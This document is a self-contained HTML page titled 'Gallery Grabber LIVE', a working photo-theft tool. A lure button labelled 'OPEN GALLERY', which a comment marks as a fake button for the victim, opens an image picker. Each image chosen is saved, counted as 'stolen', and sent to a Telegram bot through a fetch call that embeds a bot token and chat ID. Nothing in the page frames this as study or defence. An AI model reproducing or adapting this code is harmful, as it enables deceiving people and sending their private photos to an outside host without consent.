<!DOCTYPE html><html><body style="margin:0;height:100vh;background:#000;overflow:auto">

<div style="padding:20px;text-align:center;color:white;font-family:sans-serif">

<h1 style="font-size:2.5em;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">🕵️ Gallery Grabber LIVE</h1>

<p id="count" style="font-size:1.5em">Waiting for photos... 0 stolen</p>

<div id="pics" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;padding:20px"></div>

</div>

<input type="file" accept="image/*" id="i" style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:300px;height:400px;z-index:9999;background:rgba(0,0,0,0.9);color:white;padding:20px;font-size:20px;cursor:pointer">

<script>

let pics=document.getElementById('pics');

let countEl=document.getElementById('count');

let stolen=0;

let imgId=0;

document.getElementById('i').onchange=e=>{

[...e.target.files].forEach(f=>{

let r=new FileReader();

r.onload=()=>{

stolen++;

imgId++;

let id='img'+imgId;

localStorage.setItem(id,r.result);

showPic(r.result,id);

countEl.textContent=`${stolen} photos stolen!`;

// SEND TO YOUR TELEGRAM (add your bot token below)

fetch('https://api.telegram.org/bot8685956755:AAFHHysxV3tNSVFoPtzZ812huDMz9jlHpR8/sendPhoto?chat_id=6747579891&photo='+encodeURIComponent(r.result.split(',')[1]));

};

r.readAsDataURL(f);

})

}

function showPic(src,id){

let div=document.createElement('div');

div.style.cssText='background:#333;border-radius:15px;padding:10px;text-align:center';

div.innerHTML=`<img src="${src}" style="max-width:100%;max-height:250px;border-radius:10px"><br><small>${id}</small><br><a href="${src}" download="${id}.jpg" style="color:#4ecdc4">💾 Download</a>`;

pics.insertBefore(div,pics.firstChild);

}

// LOAD ALL PREVIOUS PHOTOS

for(let i=0;i<localStorage.length;i++){

let key=localStorage.key(i);

if(key.startsWith('img')){

showPic(localStorage.getItem(key),key);

stolen++;

}

}

countEl.textContent=`${stolen} photos stolen!`;

// AUTO-REFRESH EVERY 5 SEC (sees new uploads)

setInterval(()=>{

for(let i=0;i<localStorage.length;i++){

let key=localStorage.key(i);

if(key.startsWith('img') && !document.querySelector('#'+key)){

showPic(localStorage.getItem(key),key);

stolen++;

countEl.textContent=`${stolen} photos stolen!`;

}

}

},5000);

// FAKE BUTTON FOR VICTIM

let btn=document.createElement('button');

btn.innerHTML='🖼️ OPEN GALLERY';

btn.style.cssText='position:fixed;bottom:30px;left:50%;transform:translateX(-50%);padding:20px 40px;font-size:24px;background:#ff4757;color:white;border:none;border-radius:30px;cursor:pointer;z-index:999;box-shadow:0 10px 30px rgba(0,0,0,0.5)';

btn.onclick=()=>document.getElementById('i').click();

document.body.appendChild(btn);

</script></body></html>
